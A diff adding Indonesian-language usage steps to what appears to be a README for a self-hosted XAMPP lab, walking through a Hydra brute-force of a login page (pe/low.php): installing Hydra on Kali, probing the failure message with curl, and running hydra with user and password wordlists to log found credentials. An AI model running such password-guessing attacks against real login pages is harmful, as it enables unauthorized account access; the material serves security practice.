@@ -35,3 +35,28 @@ hydra -L user.txt -P pass.txt -t 4 -V 192.168.1.2 http-post-form "/pe/low.php:us
 
 **`| tee -a fixpassworddanuser.txt`**: Perintah ini digunakan untuk menyimpan output Hydra yang mengandung username dan password yang benar ke dalam file fixpassworddanuser.txt.<br>
 
+
+<br>
+<br>
+
+
+# cara pengguna 
+saya di sini mengunakan server localhost  yaitu xampp  pertama download folder **`pe`** lalu  simpan di folder xampp htdocs  contoh  **`C:\xampp1\htdocs`**
+ jika sudah maka masuk ke system oprasi linux <br>
+ di linux alian simpan folder **`user dan password`** di linux yang penting file  pass.txt dan user.txt muda di jangkau <br>
+ lalu kita mulai penetrasi server  pastikan server on jika suda buka terminal  sadisini mengunakan  **`kali linux`**
+ ````
+sudo apt update <br>
+sudo apt install hydra
+
+ ````
+
+jika suda launjutmengamati target reaksi yang di timbul  contohnya pada **`pe/low.php`** kerika terjadi kesalanhan akan timbul pesan **`:Login gagal. Username atau password salah.`** kita dapat memanfatakan fungs **`curl`** sebagai berikut <br>
+````
+curl -X POST -d "username=admin&password=admi" http://192.168.1.2/pe/low.php
+````
+
+jika suda mendapatakan target yanng d tentukan maka launjut menyesuaikan **`hydra -L user.txt -P pass.txt -t 4 -V 192.168.1.2 http-post-form "/pe/low.php:username=^USER^&password=^PASS^:Login gagal. Username atau password salah." | tee -a fixpassworddanuser.txt`**
+
+dan tunggu proseser penetrasi sampai selesai 
+ 
